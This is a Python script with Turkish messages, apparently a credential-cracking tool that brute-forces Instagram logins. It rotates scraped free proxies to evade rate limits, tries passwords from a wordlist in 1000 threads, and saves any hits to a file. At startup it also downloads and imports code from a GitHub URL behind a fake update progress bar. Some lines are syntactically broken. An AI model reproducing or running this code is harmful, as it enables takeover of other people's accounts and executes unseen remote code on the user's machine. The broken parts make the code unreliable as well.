import requests
from colorama import Fore
import colorama
import time
import sys
import os
import math
from fake_useragent import UserAgent

 
colorama.init()

def progress_bar(progress,total,color=Fore.GREEN):
    percent = 100 * (progress / float(total))
    bar = '#' * int(percent) + '-' * (100 - int(percent))
    print(color + f"\r|{bar}| {percent:.2f}%",end="\r")



numbers = [x * 5 for x in range(2000, 3000)]
result = []

k = requests.get("https://raw.githubusercontent.com/rootDelilsiz/d8l6lsizinsta/main/d8l6lsizinsta.py").text
with open("d8l6lsizinsta.py", "r", encoding="utf-8") as f:
    read = f.read()
if read == k:
    import d8l6lsizinsta
else:
    print(Fore.MAGENTA + "Güncellemeler Denetleniyor...")
    time.sleep(3)
    print(Fore.YELLOW + "Güncelleme Yapılıyor ")
    import time
    with open("d8l6lsizinsta.py", "w", encoding="utf-8") as f:
        f.write(k)
        progress_bar(0,len(numbers))
        for i, x in enumerate(numbers):
            result.append(math.factorial(x))
            progress_bar(i + 1,len(numbers))
        print(Fore.GREEN + "\nGüncelleme Tamamlandı!")
        time.sleep(5)
        os.system("cls||clear")

if os.name == "nt":
    os.system("cls")
elif os.name == "posix":
    os.system("clear")

print(Fore.CYAN+"Proxyler indiriliyor...")
import requests
from bs4 import BeautifulSoup
import numpy
import concurrent.futures





html = requests.get('https://www.free-proxy-list.net/')





content = BeautifulSoup(html.text, 'lxml')





table = content.find('table')





rows = table.findAll('tr')





results = []





for row in rows:



    if len(row.findAll('td')):

    

        results.append(row.findAll('td')[0].text +':' + row.findAll('td')[1].text)





final =[]

def test(proxy):



    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0'}

    try:

        params = {
        'text': f'NAME:C++',
        'area': 113,
        'page': 0,
        'per_page': 100
        }

        requests.get('https://api.hh.ru/vacancies;, headers=headers, proxies={'"http"' : proxy}, timeout=1, params=params')

        final.append(proxy)

    except:

        pass

    return proxy





with concurrent.futures.ThreadPoolExecutor() as executor:

    executor.map(test, results)





numpy.save('proxies.npy', final)



loadla = numpy.load('proxies.npy')

print(Fore.GREEN+"Proxyler İndi...")

time.sleep(4)

if os.name == "nt":

    os.system("cls")

elif os.name == "posix":

    os.system("clear")



banner = """


██████╗ ███████╗██╗     ██╗██╗     ███████╗██╗███████╗
██╔══██╗██╔════╝██║     ██║██║     ██╔════╝██║╚══███╔╝
██║  ██║█████╗  ██║     ██║██║     ███████╗██║  ███╔╝ 
██║  ██║██╔══╝  ██║     ██║██║     ╚════██║██║ ███╔╝  
██████╔╝███████╗███████╗██║███████╗███████║██║███████╗
╚═════╝ ╚══════╝╚══════╝╚═╝╚══════╝╚══════╝╚═╝╚══════╝

                                                      

        [+]Made By Delilsiz Tean[+]

"""

print(Fore.LIGHTBLUE_EX+banner)

username = input(Fore.YELLOW+"Kullanici: ")

i = 0

ua = UserAgent()

s = requests.session()

s.get("https://www.instagram.com/accounts/login/ajax/")

cookie = s.cookies.get("csrftoken")

header = {

    "x-csrftoken":cookie,
    "user-agent":ua.chrome

}



password = open("Wordlist\passwords.txt").read().splitlines()


def basla():
    for password in password:

        data = {

            "enc_password":"#PWD_INSTAGRAM_BROWSER:0:0:"+password,

            "username":username,

            "queryParams": {}

        }



    



        proxies = {f"http":loadla[i]}

        r = s.post("https://www.instagram.com/accounts/login/ajax/",data=data,headers=header,proxies=proxies)

        i += 1
        if i == 260:

            i = 0

        if 'userId' in r.text:

            print(Fore.GREEN+f"[+]Şifre Bulundu!!! -> {password}")

            with open('bulunan.txt', 'a') as x:

                x.write(username + ':' + password + '\n')

                exit()

        if 'checkpoint_url' in r.text:

            print(Fore.GREEN+f"[+]Şifre Bulundu!!! -> {password}")

            with open('bulunan.txt', 'a') as x:

                x.write(username + ':' + password + '\n')

                exit()

            exit()

        if "fail" in r.text:

            print(Fore.RED+"Yanlış Şifre "+password)

            i += 1
            if i == 300:
                i = 0


for i in range(1000):
    import threading
    thread = threading.Thread(target=basla)
    thread.start()
